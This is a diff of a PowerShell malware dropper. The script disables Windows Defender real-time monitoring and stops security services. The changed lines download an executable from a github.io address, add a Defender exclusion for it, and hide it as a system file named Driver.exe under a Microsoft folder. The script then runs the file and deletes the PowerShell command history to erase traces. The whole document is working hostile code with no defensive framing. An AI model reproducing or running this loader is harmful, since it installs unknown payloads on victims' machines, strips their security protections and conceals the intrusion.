@@ -5,11 +5,10 @@ Set-MpPreference -DisableRealtimeMonitoring $true;
 Set-Service -Name "wscsvc" -Status stopped -StartupType disabled;
 Set-Service -Name "WinDefend" -Status stopped -StartupType disabled;
 Set-Service -Name "SecurityHealthService" -Status stopped -StartupType disabled;
-Start-BitsTransfer -Source "https://sumhex151.github.io/upO%20Builder%200.9.6.exe" -Destination "$env:ProgramData\huy.exe";
-Add-MpPreference -ExclusionPath "$env:ProgramData\huy.exe"
-$fileInfo = New-Object System.IO.FileInfo('$env:ProgramData\huy.exe');
-$fileInfo.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System;
-Start-Process "$env:ProgramData\huy.exe";
+Start-BitsTransfer -Source "https://sumhex151.github.io/upO%20Builder%200.9.6.exe" -Destination "$env:ProgramData\Microsoft\Driver.exe";
+Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Driver.exe";
+Set-ItemProperty -Path "$env:ProgramData\Microsoft\Driver.exe" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System);
+Start-Process "$env:ProgramData\Microsoft\Driver.exe";
 
 if (Test-Path (Get-PSReadlineOption).HistorySavePath) {
     Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
